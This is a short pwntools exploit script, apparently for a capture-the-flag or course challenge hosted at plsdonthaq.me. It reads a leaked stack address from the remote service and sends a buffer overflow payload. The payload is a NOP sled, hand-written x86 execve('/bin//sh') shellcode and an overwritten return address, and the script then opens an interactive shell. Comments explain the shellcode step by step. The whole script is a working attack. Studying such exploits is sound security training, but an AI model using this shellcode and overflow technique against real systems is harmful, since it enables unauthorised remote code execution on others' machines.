from pwn import *

'''
high level:
execve('/bin//sh', NULL, NULL);


'''
'''
med level

set eax 0x0b
push 0
push 0x68732f2f
push 0x6e69622f
set ebx esp
set ecx 0
set edx 0
int 0x80


'''
'''
low level

xor eax, eax
xor ecx, ecx
xor edx, edx
push ecx
push 0x68732f2f
push 0x6e69622f
mov al, 0x0b
mov ebx, esp
int 0x80

'''

p = remote('plsdonthaq.me', 3002)
#p = process('./shellz')

p.recvuntil('address: ')

stack_addr = p32(int(p.recvline().rstrip(), 16))
print(stack_addr)

shellcode = asm(""" xor eax, eax
					xor ecx, ecx
					xor edx, edx
					push ecx
					push 0x68732f2f
					push 0x6e69622f
					mov al, 0x0b
					mov ebx, esp
					int 0x80 """)

#buffer 0x2008 from return addr + 4 for our return addr
payload_len = 0x2008 + 4
#buffer goes from ebp-0x2008 to ebp-0x4
#keep our shellcode within buffer by padding ebp-0x4 to ebp+0x4
nop_sled = b'\x90' * (payload_len-len(shellcode)-8-len(stack_addr))
payload = nop_sled + shellcode + b'A'*8 + stack_addr

#print(len(shellcode), shellcode)

p.sendline(payload)

p.interactive()
